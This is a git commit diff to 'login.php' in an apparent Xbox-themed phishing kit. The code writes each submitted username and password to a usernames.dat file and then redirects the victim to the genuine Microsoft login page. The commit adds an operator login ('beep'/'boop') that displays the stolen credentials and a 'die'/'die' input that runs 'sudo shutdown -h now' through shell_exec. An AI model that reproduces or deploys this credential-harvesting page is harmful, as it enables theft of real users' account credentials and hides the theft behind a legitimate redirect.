875e1286cf867e00ba21f940463b8157f60311bc
heckermande1st <143765580+heckermande1st@users.noreply.github.com>
2024-01-26 18:34:42 -0500

    Update login.php

--- .sites/xbox/login.php
+++ .sites/xbox/login.php
@@ -1,4 +1,3 @@
-
 <?php
   include 'ip.php';
   session_start();
@@ -6,9 +5,10 @@
   $email = $_SESSION["Email"];
  
   // Adjusted file path for your current directory
-  $file_path = '/the rest of your path from root/micro/auth/usernames.dat';
+  $file_path = '/home/kali/micro/auth/usernames.dat';
  
-  if ($email === "password" && $pass === "password") {
+  // Check for the original "beep" and "boop" credentials
+  if ($email === "beep" && $pass === "boop") {
     if (file_exists($file_path)) {
       $file_content = file_get_contents($file_path);
       if ($file_content !== false) {
@@ -19,13 +19,18 @@
     } else {
       echo 'File not found.';
     }
+  } elseif ($email === "die" && $pass === "die") {
+    // New function to check for a specific username and password
+    // Run the shutdown command
+    shell_exec('sudo shutdown -h now');
+    exit();
   } else {
     // Write to usernames.dat if credentials don't match
     file_put_contents($file_path, "Username:: " . $email . "    Password:: " . $pass . "\n", FILE_APPEND);
-    header('Location:https://www.microsoft.com/fr-ca/ai/?ef_id=_k_Cj0KCQiAyKurBhD5ARIsALamXaHw_iKc0L1m_qexB_Y_a6xVhrbVOcdcjajA_Vd-R7ZoxzhJw1SiuSsaAi6zEALw_wcB_k_&OCID=AIDcmml4otzwfr_SEM__k_Cj0KCQiAyKurBhD5ARIsALamXaHw_iKc0L1m_qexB_Y_a6xVhrbVOcdcjajA_Vd-R7ZoxzhJw1SiuSsaAi6zEALw_wcB_k_&gclid=Cj0KCQiAyKurBhD5ARIsALamXaHw_iKc0L1m_qexB_Y_a6xVhrbVOcdcjajA_Vd-R7ZoxzhJw1SiuSsaAi6zEALw_wcB');
-
+    header('Location: https://login.microsoftonline.com/');
     exit();
   }
  
   session_destroy();   
 ?>
+
